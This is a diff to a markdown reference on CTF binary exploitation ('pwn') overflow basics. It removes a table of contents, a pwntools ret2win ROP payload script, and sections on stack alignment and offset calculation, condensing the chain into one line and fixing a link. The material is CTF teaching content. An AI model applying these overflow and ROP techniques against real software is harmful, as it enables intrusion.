@@ -1,31 +1,5 @@
 # CTF Pwn - Overflow Basics
 
-## Table of Contents
-- [Stack Buffer Overflow](#stack-buffer-overflow)
-  - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
-  - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
-  - [Offset Calculation from Disassembly](#offset-calculation-from-disassembly)
-  - [Input Filtering (memmem checks)](#input-filtering-memmem-checks)
-  - [Finding Gadgets](#finding-gadgets)
-  - [Hidden Gadgets in CMP Immediates](#hidden-gadgets-in-cmp-immediates)
-- [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
-- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
-- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
-- [OOB Read via Stride/Rate Leak (DiceCTF 2026)](#oob-read-via-striderate-leak-dicectf-2026)
-- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
-- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
-- [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
-- [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
-- [Stack Canary Null-Byte Overwrite Leak (CSAW 2017)](#stack-canary-null-byte-overwrite-leak-csaw-2017)
-- [Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)](#empty-token-strncmpn0-mac-bypass-ucsb-ictf-2018)
-- [Return Address LSB Overwrite + read() Chaining (TUCTF 2018)](#return-address-lsb-overwrite--read-chaining-tuctf-2018)
-- [Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)](#canary-trailing-byte-leak-via-padding-one-byte-past-null-hxp-2018)
-- [Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)](#index-only-bounds-check--stride-oob-write-pwn-ctf-2018)
-- [Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)](#signed-index-negative-oob-to-preceding-got-pwn-ctf-2018)
-- [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
-- [scanf Input Quirks (Skip, Truncate, Saturate)](#scanf-input-quirks-skip-truncate-saturate)
-- [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)
-
 ---
 
 ## Stack Buffer Overflow
@@ -48,60 +22,13 @@ void win(long arg) {
 }
 ```
 
-**Exploitation (x86-64):**
-```python
-from pwn import *
-
-# Find gadgets
-pop_rdi_ret = 0x40150b   # pop rdi; ret
-ret = 0x40101a           # ret (for stack alignment)
-win_func = 0x4013ac
-magic = 0x1337c0decafebeef
-
-offset = 112 + 8  # = 120 bytes to reach return address
-
-payload = b"A" * offset
-payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
-payload += p64(pop_rdi_ret)
-payload += p64(magic)
-payload += p64(win_func)
-```
+**Exploitation (x86-64):** `p64(ret)` (16-byte alignment) then
+`p64(pop_rdi) + p64(magic) + p64(win)`; the offset is `rbp - buffer` plus 8.
 
 **Finding the win function:**
 - Search for `fopen("flag.txt")` or similar in Ghidra
 - Look for functions with no XREF that check a magic parameter
 - Check for conditional print/exit patterns after parameter comparison
-
-### Stack Alignment (16-byte Requirement)
-
-Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
-- SIGSEGV in `movaps` instruction (SSE requires alignment)
-- Crash inside libc functions (printf, system, etc.)
-
-**Fix:** Add extra `ret` gadget before your ROP chain:
-```python
-payload = b"A" * offset
-payload += p64(ret)        # Align stack to 16 bytes
-payload += p64(pop_rdi_ret)
-# ... rest of chain
-```
-
-### Offset Calculation from Disassembly
-
-```asm
-push   %rbp
-mov    %rsp,%rbp
-sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
-...
-lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
-mov    $0xf0,%edx        ; read() size = 240 (overflow!)
-```
-
-**Calculate offset:**
-- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
-- Saved RBP is at `rbp` (0 offset from buffer end)
-- Return address is at `rbp + 8`
-- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes
 
 ### Input Filtering (memmem checks)
 
@@ -630,7 +557,7 @@ for i in range(16):
 io.interactive()
 ```
 
-The same primitive appears as `scanf("%u", &arr[i])` in **pwnable.tw dubblesort**: `+`/`-` for the canary slot, numbers for the rest, and the bubble sort keeps the array ordered so the return address survives. See [pwnable-tw/dubblesort.md](pwnable-tw/dubblesort.md) and the case study below.
+The same primitive appears as `scanf("%u", &arr[i])` in **pwnable.tw dubblesort**: `+`/`-` for the canary slot, numbers for the rest, and the bubble sort keeps the array ordered so the return address survives. See [dubblesort](../ctf-pwn-writeups/pwnable-tw/dubblesort.md) and the case study below.
 
 ### Other pwn-relevant scanf facts
 
